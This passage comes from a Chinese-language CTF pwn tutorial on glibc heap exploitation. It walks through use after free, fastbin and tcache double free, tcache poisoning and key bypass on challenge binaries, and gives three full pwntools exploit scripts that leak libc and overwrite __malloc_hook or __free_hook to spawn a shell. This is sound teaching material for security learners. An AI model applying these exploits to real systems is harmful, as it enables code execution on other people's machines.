<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p = process(<span class="string">'./easy_heap'</span>)</span><br><span class="line">e = ELF(<span class="string">'./easy_heap'</span>)</span><br><span class="line">libc = ELF(<span class="string">'/lib/x86_64-linux-gnu/libc.so.6'</span>)</span><br><span class="line">one_gadget = <span class="number">0x10a41c</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">cmd</span><span class="params">(index:int)</span>:</span></span><br><span class="line">    p.recvuntil(<span class="string">b'&gt; '</span>)</span><br><span class="line">    p.sendline(str(index).encode())</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">new</span><span class="params">(size:int, content)</span>:</span></span><br><span class="line">    cmd(<span class="number">1</span>)</span><br><span class="line">    p.recvuntil(<span class="string">b'size \n&gt; '</span>)</span><br><span class="line">    p.sendline(str(size).encode())</span><br><span class="line">    p.recvuntil(<span class="string">b'content \n&gt; '</span>)</span><br><span class="line">    p.sendline(content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">free</span><span class="params">(index:int)</span>:</span></span><br><span class="line">    cmd(<span class="number">2</span>)</span><br><span class="line">    p.recvuntil(<span class="string">b'index \n&gt; '</span>)</span><br><span class="line">    p.sendline(str(index).encode())</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">dump</span><span class="params">(index:int)</span>:</span></span><br><span class="line">    cmd(<span class="number">3</span>)</span><br><span class="line">    p.recvuntil(<span class="string">b'index \n&gt; '</span>)</span><br><span class="line">    p.sendline(str(index).encode())</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exp</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="comment"># malloc the chunk</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">10</span>):</span><br><span class="line">        new(<span class="number">114</span>, <span class="string">"arttnba3"</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># fill the tcache</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">7</span>):</span><br><span class="line">        free(<span class="number">9</span>-i)</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># unsorted bin chunk consolidate</span></span><br><span class="line">    free(<span class="number">0</span>)</span><br><span class="line">    free(<span class="number">1</span>)</span><br><span class="line">    free(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># re-malloc the chunk</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">10</span>):</span><br><span class="line">        new(<span class="number">114</span>, <span class="string">"arttnba3"</span>)</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># fill the tcache, protect the important chunk</span></span><br><span class="line">    free(<span class="number">8</span>)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">6</span>):</span><br><span class="line">        free(i)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># unsorted bin overlap</span></span><br><span class="line">    free(<span class="number">7</span>)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">6</span>):</span><br><span class="line">        new(<span class="number">114</span>, <span class="string">"arttnba3"</span>)</span><br><span class="line">    new(<span class="number">0xF8</span>, <span class="string">"arttnba3"</span>) <span class="comment"># idx 7, the former 8</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">7</span>):</span><br><span class="line">        free(i)</span><br><span class="line">    free(<span class="number">9</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># leak the libc base</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">7</span>):</span><br><span class="line">        new(<span class="number">114</span>, <span class="string">"arttnba3"</span>)</span><br><span class="line">    new(<span class="number">114</span>, <span class="string">"arttnba3"</span>) <span class="comment"># idx 8</span></span><br><span class="line">    dump(<span class="number">7</span>)</span><br><span class="line">    main_arena = u64(p.recvuntil(<span class="string">b'\x7f'</span>)[<span class="number">-6</span>:].ljust(<span class="number">8</span>, <span class="string">b'\x00'</span>)) - <span class="number">96</span></span><br><span class="line">    __malloc_hook = main_arena - <span class="number">0x10</span></span><br><span class="line">    libc_base = __malloc_hook - libc.sym[<span class="string">'__malloc_hook'</span>]</span><br><span class="line">    log.info(<span class="string">"libc addr leak: "</span> + hex(libc_base))</span><br><span class="line"></span><br><span class="line">    <span class="comment"># tcache poisoning</span></span><br><span class="line">    new(<span class="number">114</span>, <span class="string">"arttnba3"</span>) <span class="comment"># idx 9</span></span><br><span class="line">    free(<span class="number">0</span>)</span><br><span class="line">    free(<span class="number">1</span>)</span><br><span class="line">    free(<span class="number">7</span>)</span><br><span class="line">    free(<span class="number">2</span>)</span><br><span class="line">    free(<span class="number">9</span>)</span><br><span class="line">    new(<span class="number">114</span>, p64(libc_base + libc.sym[<span class="string">'__malloc_hook'</span>]))</span><br><span class="line">    new(<span class="number">114</span>, <span class="string">"arttnba3"</span>)</span><br><span class="line">    new(<span class="number">114</span>, <span class="string">"arttnba3"</span>)</span><br><span class="line">    new(<span class="number">114</span>, p64(libc_base + one_gadget)) <span class="comment"># fake chunk</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># get the shell</span></span><br><span class="line">    cmd(<span class="number">1</span>)</span><br><span class="line">    p.interactive()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    exp()</span><br></pre></td></tr></table></figure>

<p>运行，成功getshell（本地环境Ubuntu18.0.4）</p>
<p><img src="https://i.loli.net/2020/11/26/XAZm7UrvFw8cfih.png" alt="image.png"></p>
<h3 id="三、use-after-free"><a href="#三、use-after-free" class="headerlink" title="三、use after free"></a>三、use after free</h3><p>use after free即对于垂悬指针的利用，在这类题目中往往题目在逻辑设计上会在free一个堆块后留下一个垂悬指针，未将其置NULL，使得该堆块虽然被free了，但是我们仍然能够使用该堆块</p>
<p>常见的垂悬指针利用有：</p>
<ul>
<li>泄露数据</li>
<li>构造任意地址写</li>
</ul>
<h5 id="例题：ciscn-2019-n-3-Use-After-Free"><a href="#例题：ciscn-2019-n-3-Use-After-Free" class="headerlink" title="例题：ciscn_2019_n_3 - Use After Free"></a>例题：ciscn_2019_n_3 - Use After Free</h5><p>惯例的<code>checksec</code>，发现只开了NX和canary（<del>又是32位堆题，好烦a</del></p>
<p><img src="https://i.loli.net/2021/01/31/neG2dQumBhsrzLD.png" alt=""></p>
<p>拖入IDA进行分析，大概是一道有着分配、释放、打印堆块功能的程序</p>
<p><img src="https://i.loli.net/2021/02/01/rcKNdhuEGpJb1CH.png" alt=""></p>
<p>释放堆块时用的是堆块上的函数指针</p>
<p><img src="https://i.loli.net/2021/02/01/HloCX5q9FbcuvRf.png" alt=""></p>
<p>在释放堆块后不会将堆块指针置NULL，<strong>存在UAF漏洞</strong></p>
<p><img src="https://i.loli.net/2021/02/01/lBSJXRweGYZjWMN.png" alt=""></p>
<p><img src="https://i.loli.net/2021/02/01/dQPegf7Bs9NVhxX.png" alt=""></p>
<p>由于程序中存在system函数，故考虑通过UAF覆写堆块指针为system后执行<code>system(&quot;sh&quot;)</code>以get shell</p>
<p>构造exp如下：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment">#context.log_level = 'debug'</span></span><br><span class="line">context.arch = <span class="string">'i386'</span></span><br><span class="line">p = process(<span class="string">'./ciscn_2019_n_3'</span>) <span class="comment"># p = remote('node3.buuoj.cn', 27248)</span></span><br><span class="line">e = ELF(<span class="string">'./ciscn_2019_n_3'</span>)</span><br><span class="line">libc = ELF(<span class="string">'./libc-2.27.so'</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">cmd</span><span class="params">(command: int)</span>:</span></span><br><span class="line">    p.recvuntil(<span class="string">b"CNote"</span>)</span><br><span class="line">    p.sendline(str(command).encode())</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">new</span><span class="params">(index: int, value: int)</span>:</span></span><br><span class="line">    cmd(<span class="number">1</span>)</span><br><span class="line">    p.recvuntil(<span class="string">b"Index"</span>)</span><br><span class="line">    p.sendline(str(index).encode())</span><br><span class="line">    p.recvuntil(<span class="string">b"Type"</span>)</span><br><span class="line">    p.sendline(str(<span class="number">1</span>).encode())</span><br><span class="line">    p.recvuntil(<span class="string">b"Value"</span>)</span><br><span class="line">    p.sendline(str(value).encode())</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">new</span><span class="params">(index: int, length: int, content)</span>:</span></span><br><span class="line">    cmd(<span class="number">1</span>)</span><br><span class="line">    p.recvuntil(<span class="string">b"Index"</span>)</span><br><span class="line">    p.sendline(str(index).encode())</span><br><span class="line">    p.recvuntil(<span class="string">b"Type"</span>)</span><br><span class="line">    p.sendline(str(<span class="number">2</span>).encode())</span><br><span class="line">    p.recvuntil(<span class="string">b"Length"</span>)</span><br><span class="line">    p.sendline(str(length).encode())</span><br><span class="line">    p.recvuntil(<span class="string">b"Value &gt; "</span>)</span><br><span class="line">    p.sendline(content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">free</span><span class="params">(index: int)</span>:</span></span><br><span class="line">    cmd(<span class="number">2</span>)</span><br><span class="line">    p.recvuntil(<span class="string">b"Index"</span>)</span><br><span class="line">    p.sendline(str(index).encode())</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">dump</span><span class="params">(index: int)</span>:</span></span><br><span class="line">    cmd(<span class="number">3</span>)</span><br><span class="line">    p.recvuntil(<span class="string">b"Index"</span>)</span><br><span class="line">    p.sendline(str(index).encode())</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exp</span><span class="params">()</span>:</span></span><br><span class="line">    new(<span class="number">0</span>, <span class="number">0x114</span>, <span class="string">b'arttnba3'</span>) <span class="comment"># idx 0</span></span><br><span class="line">    new(<span class="number">1</span>, <span class="number">0x114</span>, <span class="string">b'arttnba3'</span>) <span class="comment"># idx 1</span></span><br><span class="line">    free(<span class="number">0</span>)</span><br><span class="line">    free(<span class="number">1</span>)</span><br><span class="line">    new(<span class="number">2</span>, <span class="number">0xc</span>, <span class="string">b'sh\x00\x00'</span> + p32(e.sym[<span class="string">'system'</span>])) <span class="comment"># idx2, overlapping with idx 0</span></span><br><span class="line">    free(<span class="number">0</span>)</span><br><span class="line">    p.interactive()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    exp()</span><br></pre></td></tr></table></figure>

<p>运行即可get shell</p>
<p><img src="https://i.loli.net/2021/02/01/eEQf6L8dWs2hmk7.png" alt=""></p>
<h4 id="double-free-1"><a href="#double-free-1" class="headerlink" title="double free"></a>double free</h4><p>double free则是use after free中最为热门的一种利用方式，当同一个chunk在堆管理器中同时存在两份副本时，我们将其中一个堆块分配回来并改写其fd指针，当该chunk再一次被取出时，留在堆管理器中的chunk地址便是由我们控制的chunk地址，此时我们再行分配便可以在我们所希望的地址获得一个chunk，<strong>实现任意地址写</strong></p>
<h4 id="fastbin-double-free"><a href="#fastbin-double-free" class="headerlink" title="fastbin double free"></a>fastbin double free</h4><p>由于fastbin对于double free的检查较为稀松，故通常考虑通过fastbin double free进行任意地址写</p>
<p>fastbin仅会检查链表的第一个节点，故仅需要构造<code>A-&gt;B-&gt;A</code>的free()链即可完成fastbin double free</p>
<h5 id="size检查"><a href="#size检查" class="headerlink" title="size检查"></a>size检查</h5><p>在malloc取出fastbin中的chunk时会检查其size字段，若与其对应下标不相符则会引发程序abort，限制了我们所能构造fake chunk的位置，但该size检查不会检查标志位</p>
<h5 id="malloc-hook-0x23"><a href="#malloc-hook-0x23" class="headerlink" title="__malloc_hook - 0x23"></a>__malloc_hook - 0x23</h5><p>fastbin attack中分配到__malloc_hook附近的fake chunk通常都是malloc(0x60)，也就是size == 0x71，这是因为在__malloc_hook - 0x23这个地址上fake chunk的SIZE的位置刚好是<code>0x7f</code>，满足了绕过fastbin的size检查的要求</p>
<p><img src="https://i.loli.net/2020/12/03/GBrOqIdPnDluXhb.png" alt="image.png"></p>
<p>这是一个十分巧妙的内存上的位置，因为无论何时这个位置上的值都是0x7f，同时离__malloc_hook仅有0x23字节的距离，我们在构造size为0x71的fastbin fake chunk时若是构造到这个位置则完全不需要担心size检查的问题，因此__malloc_hook - 0x23也就成为了构造fastbin fake chunk的“热门地带”</p>
<p>需要注意的是在libc2.31版本中这个位置上的数据已经不再是0x7f，故我们需要<code>具体问题具体分析,具体版本具体调试</code></p>
<p><img src="https://i.loli.net/2021/02/09/uqTerVoWkSvXM3E.png" alt=""></p>
<h5 id="例题："><a href="#例题：" class="headerlink" title="例题："></a>例题：</h5><h4 id="tcache-double-free"><a href="#tcache-double-free" class="headerlink" title="tcache double free"></a>tcache double free</h4><p>前面讲到，由于检查十分稀松的缘故，自libc2.26起引进的tcache机制便成为了ptmalloc利用的大热门，libc2.29前对于double free几乎视而不见的机制也让pwn手们不用绞尽脑汁构造以前形如<code>A-&gt;B-&gt;A</code>的复杂利用链</p>
<h5 id="例题：babygame-double-free-tcache-poisoning"><a href="#例题：babygame-double-free-tcache-poisoning" class="headerlink" title="例题：babygame - double free + tcache poisoning"></a>例题：babygame - double free + tcache poisoning</h5><blockquote>
<p>设计很巧妙的一道题，以及我差不多是硬调出来的（</p>
</blockquote>
<p><a href="/download/starCTF2021/pwn/babygame.zip" title="点击此处下载原题">点击下载-babygame.zip</a></p>
<p>惯例的checksec，保护全开</p>
<p><img src="https://i.loli.net/2021/01/20/y7LnNfmzYWPuc9G.png" alt="image.png"></p>
<p>运行一下，大概可以知道这是一个推箱子小游戏</p>
<p><img src="https://i.loli.net/2021/01/22/7NYPhxkrXisWUqB.png" alt=""></p>
<p>拖入IDA进行分析，<del>符号表被扣光，分析出一坨shit</del></p>
<blockquote>
<p>部分函数、变量名经重命名</p>
</blockquote>
<p>在一开始时会分配一个大小为0x500的chunk，<strong>超出了tcache的范围</strong>，在<strong>free时会被直接放入Unsorted Bin中</strong></p>
<p><img src="https://i.loli.net/2021/01/22/6i8zvdhmw31ekBn.png" alt="image.png"></p>
<p>在尝试退出时可以输入一个字符串，最后会free掉这个0x500的大chunk，但是后面我们又可以重新将这个chunk申请回来（通过程序的restart功能），<strong>这个时候就会在chunk上残留指向main_arena + 96的指针</strong></p>
<p><img src="https://i.loli.net/2021/01/22/gXxwGDlWqTkPVLK.png" alt="image.png"></p>
<p>同时，题目中有着打印该chunk的功能，通过free后重新malloc的方式<strong>我们便可以获得libc的基址</strong></p>
<p><img src="https://i.loli.net/2021/01/22/6W2lrHsLmZ7hRvE.png" alt="image.png"></p>
<p>题目的漏洞点在于当你<strong>成功通过一关后再选择下一关之后选择退出便会导致double free</strong></p>
<p><img src="https://i.loli.net/2021/01/22/AR2OPinM8D5Kaeu.png" alt=""></p>
<p>gdb调试，我们将断点下在<code>malloc_printerr()</code>函数处，其上层调用函数为<code>_int_free(mstate av, mchunkptr p, int have_lock)</code>，那么我们<strong>便可以从rsi寄存器处获取到被double free的chunk的地址</strong></p>
<p><img src="https://i.loli.net/2021/01/23/XtUISQ2ckoZgbsz.png" alt=""></p>
<p>其size为<code>0x61</code></p>
<p><img src="https://i.loli.net/2021/01/23/D2uwcevXVQsqJih.png" alt=""></p>
<p><del>经历了在IDA中苦苦哀嚎无数小时后</del>进行动态调式时观察到对于程序的leave your name功能其会根据输入的长度分配相应大小的堆块</p>
<p><img src="https://i.loli.net/2021/01/23/6RWdGglwUM8ntLO.png" alt=""></p>
<p><img src="https://i.loli.net/2021/01/23/DdY3TGBJjmfSkVP.png" alt=""></p>
<p>同时观察到<strong>该类型堆块不会被释放，而是会每次输入都申请一次</strong></p>
<p><img src="https://i.loli.net/2021/01/23/Hnj1BqmPCirKRLk.png" alt=""></p>
<p><img src="https://i.loli.net/2021/01/23/wSIONf7Epij3lCq.png" alt=""></p>
<p>那么我们便可以<strong>利用程序的leave your name功能申请任意次数的任意大小的堆块</strong></p>
<p>同时<strong>题目所给的libc为可以进行tcache double free的2.27版本</strong></p>
<p><img src="https://i.loli.net/2021/01/22/YpaDTSGX2mLBzvQ.png" alt=""></p>
<p>同时<strong>在message功能中我们是可以往0x500的大chunk中写入内容的，而在程序退出时该chunk会被释放</strong></p>
<p><img src="https://i.loli.net/2021/01/23/Ga3ehQvfPrDdLpJ.png" alt=""></p>
<p>那么我们便考虑<strong>先泄露libc地址后通过double free构造tcache poisoning进行任意地址写改写__free_hook为system函数后通过message功能创建内容为”/bin/sh”的堆块后退出使得该堆块被释放即可get shell</strong></p>
<p>最后构造exp如下：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment">#context.log_level = 'DEBUG'</span></span><br><span class="line">context.arch = <span class="string">'amd64'</span></span><br><span class="line"></span><br><span class="line">p = process(<span class="string">'./pwn'</span>, env=&#123;<span class="string">'LD_PRELOAD'</span>:<span class="string">'./libc.so.6'</span>&#125;) <span class="comment"># p = remote('52.152.231.198', 8082)</span></span><br><span class="line">e = ELF(<span class="string">'./pwn'</span>)</span><br><span class="line">libc = ELF(<span class="string">'./libc.so.6'</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">double_free</span><span class="params">()</span>:</span></span><br><span class="line">    p.recvuntil(<span class="string">b"Please input an level from 1-9:"</span>)</span><br><span class="line">    p.sendline(<span class="string">b"1"</span>)</span><br><span class="line">    p.recvuntil(<span class="string">b"Please input an order:"</span>)</span><br><span class="line">    p.sendline(<span class="string">b"w"</span>)</span><br><span class="line">    p.recvuntil(<span class="string">b"Please input an order:"</span>)</span><br><span class="line">    p.sendline(<span class="string">b"s"</span>)</span><br><span class="line">    p.recvuntil(<span class="string">b"Please input an order:"</span>)</span><br><span class="line">    p.sendline(<span class="string">b"a"</span>)</span><br><span class="line">    p.recvuntil(<span class="string">b"Please input an order:"</span>)</span><br><span class="line">    p.sendline(<span class="string">b"a"</span>)</span><br><span class="line">    p.recvuntil(<span class="string">b"Please input an order:"</span>)</span><br><span class="line">    p.sendline(<span class="string">b"d"</span>)</span><br><span class="line">    p.recvuntil(<span class="string">b"Please input an order:"</span>)</span><br><span class="line">    p.sendline(<span class="string">b"s"</span>)</span><br><span class="line">    p.recvuntil(<span class="string">b"Please input an order:"</span>)</span><br><span class="line">    p.sendline(<span class="string">b"s"</span>)</span><br><span class="line">    p.recvuntil(<span class="string">b"Please input an order:"</span>)</span><br><span class="line">    p.sendline(<span class="string">b"w"</span>)</span><br><span class="line">    p.recvuntil(<span class="string">b"Please input an order:"</span>)</span><br><span class="line">    p.sendline(<span class="string">b"d"</span>)</span><br><span class="line">    p.recvuntil(<span class="string">b"Please input an order:"</span>)</span><br><span class="line">    p.sendline(<span class="string">b"d"</span>)</span><br><span class="line">    p.recvuntil(<span class="string">b"Please input an level from 1-9:"</span>)</span><br><span class="line">    p.sendline(<span class="string">b"1"</span>)</span><br><span class="line">    p.recvuntil(<span class="string">b"Please input an order:"</span>)</span><br><span class="line">    p.sendline(<span class="string">b"q"</span>)</span><br><span class="line">    p.recvuntil(<span class="string">b"leave your name?"</span>)</span><br><span class="line">    p.sendline(<span class="string">b"n"</span>)</span><br><span class="line">    p.recvuntil(<span class="string">b"restart?"</span>)</span><br><span class="line">    p.sendline(<span class="string">b"y"</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">new</span><span class="params">(content)</span>:</span></span><br><span class="line">    p.sendline(<span class="string">b"q"</span>)</span><br><span class="line">    p.recvuntil(<span class="string">b"leave your name?"</span>)</span><br><span class="line">    p.sendline(<span class="string">b"y"</span>)</span><br><span class="line">    p.recvuntil(<span class="string">b"your name:"</span>)</span><br><span class="line">    p.sendline(content)</span><br><span class="line">    p.recvuntil(<span class="string">b"restart?"</span>)</span><br><span class="line">    p.sendline(<span class="string">b"y"</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">leak</span><span class="params">()</span>:</span></span><br><span class="line">    p.sendline(<span class="string">b"q"</span>)</span><br><span class="line">    p.recvuntil(<span class="string">b"leave your name?"</span>)</span><br><span class="line">    p.sendline(<span class="string">b"n"</span>)</span><br><span class="line">    p.recvuntil(<span class="string">b"restart?"</span>)</span><br><span class="line">    p.sendline(<span class="string">b"y"</span>)</span><br><span class="line">    p.recvuntil(<span class="string">b"Please input an level from 1-9:"</span>)</span><br><span class="line">    p.sendline(<span class="string">b"l"</span>)</span><br><span class="line">    p.recvuntil(<span class="string">b"message:"</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exp</span><span class="params">()</span>:</span></span><br><span class="line">    leak()</span><br><span class="line">    main_arena = u64(p.recvuntil(<span class="string">b"\x7f"</span>)[<span class="number">-6</span>:].ljust(<span class="number">8</span>, <span class="string">b"\x00"</span>)) - <span class="number">96</span></span><br><span class="line">    __malloc_hook = main_arena - <span class="number">0x10</span></span><br><span class="line">    libc_base = __malloc_hook - libc.sym[<span class="string">'__malloc_hook'</span>]</span><br><span class="line">    double_free()</span><br><span class="line">    new(<span class="string">b''</span>.ljust(<span class="number">0x50</span>, <span class="string">b'A'</span>)) <span class="comment"># a redundante chunk tested out</span></span><br><span class="line">    new(p64(libc_base + libc.sym[<span class="string">'__free_hook'</span>]).ljust(<span class="number">0x50</span>, <span class="string">b'A'</span>))</span><br><span class="line">    new(<span class="string">b''</span>.ljust(<span class="number">0x50</span>, <span class="string">b'A'</span>))</span><br><span class="line">    new(p64(libc_base + libc.sym[<span class="string">'system'</span>]).ljust(<span class="number">0x50</span>, <span class="string">b'A'</span>))</span><br><span class="line">    p.recvuntil(<span class="string">b"Please input an level from 1-9:"</span>)</span><br><span class="line">    p.sendline(<span class="string">'1'</span>)</span><br><span class="line">    p.recvuntil(<span class="string">b"Please input an order:"</span>)</span><br><span class="line">    p.sendline(<span class="string">b"m"</span>)</span><br><span class="line">    p.sendline(<span class="string">b"/bin/sh\x00"</span>)</span><br><span class="line">    p.recvuntil(<span class="string">b"Please input an order:"</span>)</span><br><span class="line">    p.sendline(<span class="string">b"q"</span>)</span><br><span class="line">    p.recvuntil(<span class="string">b"leave your name?"</span>)</span><br><span class="line">    p.sendline(<span class="string">b"n"</span>)</span><br><span class="line">    p.interactive()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    exp()</span><br></pre></td></tr></table></figure>

<p>运行即可get shell</p>
<p><img src="https://i.loli.net/2021/01/22/hOBAxz4YWRQoaf2.png" alt=""></p>
<h4 id="tcache-key-bypass（libc-2-29-and-up）"><a href="#tcache-key-bypass（libc-2-29-and-up）" class="headerlink" title="tcache key bypass（libc 2.29 and up）"></a>tcache key bypass（libc 2.29 and up）</h4><p>前面讲到，自glibc2.29版本起tcache新增了一个key字段，该字段位于chunk的bk字段，值为tcache结构体的地址，若free()检测到chunk-&gt;bk == tcache则会遍历tcache对应链表中是否有该chunk</p>
<p>在这种情况下，我们在进行tcache double free之前，<strong>还需要清除tcache key</strong>，而不能像fastbin那样靠构造A-&gt;B-&gt;A的free链绕过，但好处是<strong>我们可以通过tcache key直接泄露堆基址</strong></p>
<p>CTF中涉及tcache key的题目中通常都会提供有清除该key的方法，若没有也可以重新回归fastbin的利用</p>
<h5 id="例题1（清除tcache-key）："><a href="#例题1（清除tcache-key）：" class="headerlink" title="例题1（清除tcache key）："></a>例题1（清除tcache key）：</h5><h5 id="例题2（fastbin-double-free）："><a href="#例题2（fastbin-double-free）：" class="headerlink" title="例题2（fastbin double free）："></a>例题2（fastbin double free）：</h5><h3 id="四、ROP"><a href="#四、ROP" class="headerlink" title="四、ROP"></a>四、ROP</h3><p>在堆题的世界并非只能够通过劫持各种hook来达到控制程序执行流的效果，传统的在栈上构造ROP链的方式仍旧未过时，利用各种pwn技巧我们仍旧可以通过在栈上构造ROP链的方式控制程序执行流</p>
